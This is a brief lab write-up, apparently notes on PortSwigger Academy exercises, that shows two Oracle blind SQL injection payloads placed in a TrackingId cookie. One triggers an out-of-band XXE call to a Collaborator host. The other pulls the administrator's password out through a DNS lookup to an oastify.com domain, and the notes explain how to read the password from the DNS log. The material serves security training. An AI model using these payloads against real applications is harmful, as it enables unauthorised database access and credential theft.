## SQL Injection Scenerios
### Blind SQL injection with out-of-band interaction
Ref: https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band<br>
https://portswigger.net/web-security/sql-injection/cheat-sheet<br>
Tracking cookie is vulnerable to SQL Injection. You will have to try the payloads from the above link for different database. We have modified the payload using single quote and UNION operator, finally URL encode it (CTRL +U). Below payload is for Oracle unpatched versions.
```
Cookie: TrackingId=X'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP_COLLABORATOR/">+%25remote%3b]>'),'/l')+FROM+dual--
```
We got the response on the collaborator server that confirms the presence of out of band SQL Injection vulnerablilty.
### Blind SQL Injection with data exfiltration
Ref: https://portswigger.net/web-security/sql-injection/cheat-sheet<br>
Tracking cookie is vulnerable to SQL Injection. You will have to try the payloads from the above link for different database. We have modified the payload using single quote and UNION operator, finally URL encode it (CTRL +U). 
```
Cookie: TrackingId=SA3Y8Dnuxa2Ag799'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+from+users+where+username%3d'administrator')||'.prkxyd141jllo9seb9810lhzmqshg84x.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--;
```
If you recieve DNS like this: The Collaborator server received a DNS lookup of type AAAA for the domain name h81jh6xbrh7yya8ta7jk.prkxyd141jllo9seb9810lhzmqshg84x.oastify.com then the password of administrator is h81jh6xbrh7yya8ta7jk.
